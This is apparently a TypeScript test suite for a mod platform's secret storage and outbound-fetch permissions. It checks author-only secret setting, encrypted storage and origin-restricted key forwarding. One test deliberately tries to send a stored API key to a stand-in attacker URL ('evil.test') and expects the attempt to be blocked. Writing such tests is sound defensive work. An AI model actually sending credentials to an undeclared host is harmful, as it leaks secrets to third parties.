// A mod's secrets: only the author sets one, only a declared name, the value
// never comes back out, and a fetch carries it only toward its declared
// origins, for whoever may run the mod (the author, or the team it is shared
// with). A connector read refuses a source the manifest does not grant.
import { afterAll, afterEach, beforeAll, expect, setDefaultTimeout, test } from "bun:test";
import { convexTest } from "convex-test";
import { anyApi } from "convex/server";
import schema from "./schema";
import { hashToken } from "./apiTokens";

setDefaultTimeout(60_000);

const api = anyApi as any;
const TOKEN = "e".repeat(64);
const KEY_ENV = "CONNECTION_SECRETS_KEY";

const modules = {
  "./_generated/server.ts": () => import("./_generated/server"),
  "./modLocal.ts": () => import("./modLocal"),
  "./modSecrets.ts": () => import("./modSecrets"),
  "./modServer.ts": () => import("./modServer"),
};

const realFetch = globalThis.fetch;
let sent: { url: string; headers: Record<string, string> }[] = [];
let previousKey: string | undefined;
beforeAll(() => {
  previousKey = process.env[KEY_ENV];
  process.env[KEY_ENV] = "test-deployment-key-0123456789abcdef";
  globalThis.fetch = (async (url: any, init: any) => {
    sent.push({ url: String(url), headers: { ...(init?.headers ?? {}) } });
    return new Response(JSON.stringify({ hello: "union" }), { status: 200, headers: { "content-type": "application/json" } });
  }) as any;
});
afterAll(() => {
  globalThis.fetch = realFetch;
  if (previousKey === undefined) delete process.env[KEY_ENV];
  else process.env[KEY_ENV] = previousKey;
});

const backends: any[] = [];
afterEach(async () => {
  sent = [];
  for (const t of backends.splice(0)) await t.finishAllScheduledFunctions?.(() => {}).catch?.(() => {});
});

const MANIFEST = {
  name: "union",
  permissions: { fetch: ["https://api.union.test"], connectors: ["union"] },
  secrets: [{ name: "UNION_KEY", origins: ["https://api.union.test"] }],
};

async function seed() {
  const t = convexTest(schema, modules);
  backends.push(t);
  const now = Date.now();
  const ids = await t.run(async (ctx) => {
    const team = await ctx.db.insert("teams", { name: "Union", created_at: now, invite_code: "x" } as any);
    const ana = await ctx.db.insert("users", { name: "Ana" } as any);
    const ben = await ctx.db.insert("users", { name: "Ben" } as any);
    const cat = await ctx.db.insert("users", { name: "Cat" } as any);
    for (const u of [ana, ben]) await ctx.db.insert("team_memberships", { user_id: u, team_id: team, role: "member", joined_at: now } as any);
    await ctx.db.insert("api_tokens", { user_id: ana, token_hash: await hashToken(TOKEN), name: "cli", created_at: now, last_used_at: now } as any);
    const mod = await ctx.db.insert("mods", {
      user_id: ana, team_id: team, shared: true, name: "union", manifest: MANIFEST, code: "",
      rev: 1, version: 0, enabled: true, created_at: now, updated_at: now,
    } as any);
    return { team, ana, ben, cat, mod };
  });
  const as = (u: string) => t.withIdentity({ subject: `${u}|test` });
  const fetchAs = (u: string, url: string, init: Record<string, unknown>) =>
    as(u).action(api.modServer.call, { mod_id: ids.mod, method: "http.fetch", args_json: JSON.stringify([url, init]) });
  return { t, ...ids, as, fetchAs };
}

test("only the author sets a declared secret, and the row says when without the value", async () => {
  const { t, mod, ana, ben, as } = await seed();
  expect(await as(ben).action(api.modSecrets.webSet, { mod_id: mod, secret: "UNION_KEY", value: "k" })).toMatchObject({ error: expect.stringMatching(/author/) });
  expect(await as(ana).action(api.modSecrets.webSet, { mod_id: mod, secret: "OTHER_KEY", value: "k" })).toMatchObject({ error: expect.stringMatching(/declares no secret/) });
  expect(await as(ana).action(api.modSecrets.webSet, { mod_id: mod, secret: "UNION_KEY", value: "sk-live-1" })).toMatchObject({ ok: true });

  const [row, stored] = await t.run(async (ctx: any) => [await ctx.db.get(mod), await ctx.db.query("mod_secrets").collect()]);
  expect(row.secrets_set.map((s: any) => s.name)).toEqual(["UNION_KEY"]);
  expect(stored[0].value_enc).not.toContain("sk-live-1");

  const listed = await t.query(api.modSecrets.cliList, { api_token: TOKEN, name: "union" });
  expect(listed.secrets[0]).toMatchObject({ name: "UNION_KEY", set_at: expect.any(Number) });
  expect(JSON.stringify(listed)).not.toContain("sk-live-1");
});

test("a teammate's fetch carries the key to its origin and nowhere else", async () => {
  const { mod, ana, ben, cat, as, fetchAs } = await seed();
  expect(await fetchAs(ben, "https://api.union.test/refs", { secret: "UNION_KEY" })).toMatchObject({ ok: false, error: expect.stringMatching(/not set/) });
  await as(ana).action(api.modSecrets.webSet, { mod_id: mod, secret: "UNION_KEY", value: "sk-live-1" });

  const res = await fetchAs(ben, "https://api.union.test/refs", { secret: "UNION_KEY", headers: { Authorization: "Bearer forged" } });
  expect(res).toMatchObject({ ok: true, status: 200, json: { hello: "union" } });
  expect(sent).toEqual([{ url: "https://api.union.test/refs", headers: { Authorization: "Bearer sk-live-1" } }]);
  expect(JSON.stringify(res)).not.toContain("sk-live-1");

  expect(await fetchAs(ben, "https://evil.test/x", { secret: "UNION_KEY" })).toMatchObject({ ok: false, error: expect.stringMatching(/sent only to/) });
  expect(await fetchAs(cat, "https://api.union.test/refs", { secret: "UNION_KEY" })).toMatchObject({ ok: false, error: expect.stringMatching(/not one you run/) });
  expect(sent.length).toBe(1);
});

test("a connector read names only a granted source", async () => {
  const { mod, ben, as } = await seed();
  const res = await as(ben).action(api.modServer.call, { mod_id: mod, method: "connector.read", args_json: JSON.stringify(["sentry", "issues", {}]) });
  expect(res).toMatchObject({ ok: false, error: expect.stringMatching(/permissions.connectors/) });
});
